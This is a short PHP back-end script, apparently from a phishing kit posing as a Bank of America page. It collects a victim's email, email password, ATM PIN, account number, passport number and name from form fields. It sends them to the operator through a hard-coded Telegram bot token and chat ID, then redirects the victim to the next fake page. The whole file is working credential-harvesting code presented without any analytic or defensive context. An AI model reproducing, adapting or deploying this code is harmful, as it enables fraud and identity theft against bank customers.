<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['email']) && isset ($_POST['cpass']) && isset ($_POST['pin'])&& isset ($_POST['label145'])&& isset ($_POST['label909']) && isset ($_POST['label5654']) ){

$message = "\n🤔User BANK bofa 🤔\n🔑email: => ".$_POST['email']."  \n🔑email poss: => ".$_POST['cpass']." \npin atm: => ".$_POST['pin']." \nAccount Number: => ".$_POST['label145']." \nPassport: => ".$_POST['label909']." \nname: => ".$_POST['label5654']." \r\n.";

$apiToken = "6194698603:AAEwaznctVDX7ZGLoIR9-HWKu2ZOYInIy9Q";


$data = [
  'chat_id' => '6063765094',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: index3.html');

}else{ header ('location: index2.html'); exit(); }

?>